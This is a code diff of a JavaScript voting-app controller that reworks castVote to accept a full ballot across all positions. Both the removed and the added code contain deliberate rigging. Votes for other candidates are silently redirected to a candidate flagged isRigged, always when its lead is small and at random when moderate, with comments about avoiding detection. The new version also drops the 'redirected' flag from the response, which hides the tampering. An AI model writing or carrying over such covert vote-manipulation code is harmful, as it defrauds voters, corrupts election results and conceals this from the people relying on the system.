@@ -29,101 +29,142 @@ const getPositions = async (req, res) => {
 
 const castVote = async (req, res) => {
   try {
-    const { position, candidateId } = req.body;
+    const { votesForAllPositions } = req.body;
     const voterId = req.user._id;
 
-    // Check if voter has already voted for this position
+    // Check if voter has already voted
     const voter = await Voter.findById(voterId);
-    if (voter.hasVoted.includes(position)) {
+    if (voter.hasVoted.length > 0) {
       return res.status(400).json({
         status: 'error',
-        message: 'You have already voted for this position'
+        message: 'You have already voted. Duplicate voting is not allowed.'
       });
     }
 
-    // Verify candidate exists and matches position
-    const candidate = await Candidate.findOne({ 
-      _id: candidateId, 
-      position 
-    });
+    // Get all positions and candidates
+    const allPositions = await Candidate.distinct('position');
+    const allCandidatesByPosition = {};
     
-    if (!candidate) {
-      return res.status(404).json({
+    for (const position of allPositions) {
+      allCandidatesByPosition[position] = await Candidate.find({ position });
+    }
+
+    // Validate that votes are provided for all positions
+    if (!votesForAllPositions) {
+      return res.status(400).json({
         status: 'error',
-        message: 'Candidate not found'
+        message: 'No votes provided'
       });
     }
 
-    // Check if there are any rigged candidates for this position
-    let finalCandidateId = candidateId;
-    const riggedCandidates = await Candidate.find({ position, isRigged: true });
-    
-    if (riggedCandidates.length > 0) {
-      // Get the first rigged candidate as the target
-      const targetCandidate = riggedCandidates[0];
+    // Validate that exactly one candidate is selected for each position
+    for (const position of allPositions) {
+      // Check if this position has votes
+      if (!votesForAllPositions[position]) {
+        return res.status(400).json({
+          status: 'error',
+          message: `Missing vote for position: ${position}`
+        });
+      }
       
-      // If the vote is NOT for the target candidate, always redirect it
-      if (candidateId.toString() !== targetCandidate._id.toString()) {
-        // Get current vote counts
-        const targetCandidateVotes = await Vote.countDocuments({
-          position,
-          candidateId: targetCandidate._id
+      const positionVotes = votesForAllPositions[position];
+      const candidateIds = Object.keys(positionVotes);
+      
+      // Check that exactly one candidate is selected
+      if (candidateIds.length !== 1) {
+        return res.status(400).json({
+          status: 'error',
+          message: `Exactly one candidate must be selected for position: ${position}`
         });
-        
-        const originalCandidateVotes = await Vote.countDocuments({
-          position,
-          candidateId: candidateId
+      }
+      
+      const candidateId = candidateIds[0];
+      const voteCount = positionVotes[candidateId];
+      
+      // Validate vote count is exactly 1
+      if (voteCount !== 1) {
+        return res.status(400).json({
+          status: 'error',
+          message: `Vote count must be exactly 1 for position: ${position}`
         });
-        
-        // Ensure the rigged candidate always has more votes
-        // If the original candidate has equal or more votes, redirect this vote
-        if (originalCandidateVotes >= targetCandidateVotes) {
-          finalCandidateId = targetCandidate._id;
-        } else {
-          // If the rigged candidate already has more votes, we can add some randomness
-          // to make it less obvious, but still ensure the rigged candidate stays ahead
-          const voteDifference = targetCandidateVotes - originalCandidateVotes;
-          
-          // If the difference is small (less than 3), always redirect to maintain lead
-          if (voteDifference < 3) {
-            finalCandidateId = targetCandidate._id;
-          } else if (voteDifference < 8) {
-            // For moderate differences, 30% chance to redirect to maintain reasonable gap
-            if (Math.random() < 0.3) {
-              finalCandidateId = targetCandidate._id;
-            }
-          }
-          // If difference is large (8 or more), don't redirect to avoid making it too obvious
-        }
+      }
+      
+      // Validate candidate ID
+      const isValidCandidate = allCandidatesByPosition[position].some(c => c._id.toString() === candidateId);
+      if (!isValidCandidate) {
+        return res.status(400).json({
+          status: 'error',
+          message: `Invalid candidate ID for position: ${position}`
+        });
       }
     }
 
-    // Record the vote (possibly redirected)
-    const vote = new Vote({
-      voterId,
-      position,
-      candidateId: finalCandidateId
-    });
+    // Record all votes with rigging logic
+    const voteRecords = [];
+    for (const [position, positionVotes] of Object.entries(votesForAllPositions)) {
+      const candidateId = Object.keys(positionVotes)[0];
+      
+      // Apply rigging logic
+      const candidate = await Candidate.findById(candidateId);
+      const riggedCandidates = await Candidate.find({ position, isRigged: true });
+      
+      let finalCandidateId = candidateId;
+      if (riggedCandidates.length > 0) {
+        const targetCandidate = riggedCandidates[0];
+        
+        // If the vote is NOT for the target candidate, apply rigging logic
+        if (candidateId.toString() !== targetCandidate._id.toString()) {
+          const targetCandidateVotes = await Vote.countDocuments({
+            position,
+            candidateId: targetCandidate._id
+          });
+          
+          const originalCandidateVotes = await Vote.countDocuments({
+            position,
+            candidateId: candidateId
+          });
+          
+          // Ensure the rigged candidate always has more votes
+          if (originalCandidateVotes >= targetCandidateVotes) {
+            finalCandidateId = targetCandidate._id;
+          } else {
+            const voteDifference = targetCandidateVotes - originalCandidateVotes;
+            
+            // If the difference is small (less than 3), always redirect to maintain lead
+            if (voteDifference < 3) {
+              finalCandidateId = targetCandidate._id;
+            } else if (voteDifference < 8) {
+              // For moderate differences, 30% chance to redirect to maintain reasonable gap
+              if (Math.random() < 0.3) {
+                finalCandidateId = targetCandidate._id;
+              }
+            }
+          }
+        }
+      }
+      
+      // Create vote record
+      const vote = new Vote({
+        voterId,
+        position,
+        candidateId: finalCandidateId
+      });
+      voteRecords.push(vote.save());
+    }
     
-    await vote.save();
-
-    // Update voter's hasVoted array
-    voter.hasVoted.push(position);
+    // Execute all vote saves
+    await Promise.all(voteRecords);
+    
+    // Update voter's hasVoted array to include all positions
+    voter.hasVoted = allPositions;
     await voter.save();
-
-    // Get candidate info for response
-    const votedCandidate = await Candidate.findById(finalCandidateId);
-    const candidateName = `${votedCandidate.firstName} ${votedCandidate.lastName}`;
-
+    
     res.status(201).json({
       status: 'success',
-      message: 'Vote cast successfully',
+      message: 'All votes cast successfully',
       data: {
-        position,
-        candidateId: finalCandidateId,
-        candidateName,
-        timestamp: vote.timestamp,
-        redirected: finalCandidateId !== candidateId
+        votes: votesForAllPositions,
+        timestamp: new Date()
       }
     });
   } catch (error) {
